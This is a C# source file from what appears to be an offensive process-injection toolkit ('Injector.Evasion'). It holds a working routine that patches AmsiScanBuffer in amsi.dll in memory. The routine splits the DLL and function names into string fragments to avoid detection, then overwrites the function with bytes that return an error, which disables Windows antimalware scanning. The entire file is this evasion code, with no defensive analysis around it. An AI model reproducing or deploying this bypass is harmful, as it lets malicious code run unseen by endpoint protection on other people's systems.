using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Injector.Misc;
using System.Runtime.InteropServices;
using Injector.Execution;

namespace Injector.Evasion
{
    public class AMSI
    {
        /// <summary>
        /// Amsi is a class for manipulating the Antimalware Scan Interface.
        /// </summary>
        public class Amsi
        {
            /// <summary>
            /// Patch the AmsiScanBuffer function in amsi.dll.
            /// </summary>
            /// <author>Daniel Duggan (@_RastaMouse)</author>
            /// <returns>Bool. True if succeeded, otherwise false.</returns>
            /// <remarks>
            /// Credit to Adam Chester (@_xpn_).
            /// </remarks>
            public static bool PatchAmsiScanBuffer()
            {
                byte[] patch;
                if (Utilities.Is64Bit)
                {
                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                }
                else
                {
                    patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
                }

                try
                {
                    string one = "am";
                    string two = "si";
                    string three = ".";
                    string four = "dll";
                    string five = "Am";
                    string six = "siS";
                    string seven = "can";
                    string eight = "Buf";
                    string nine = "fer";
                    var library = Win32.Kernel32.LoadLibrary(one + two + three + four);
                    var address = Win32.Kernel32.GetProcAddress(library, five + six + seven + eight + nine);

                    uint oldProtect;
                    Win32.Kernel32.VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);

                    Marshal.Copy(patch, 0, address, patch.Length);

                    return true;
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("Exception: " + e.Message);
                    return false;
                }
            }
        }
    }
}
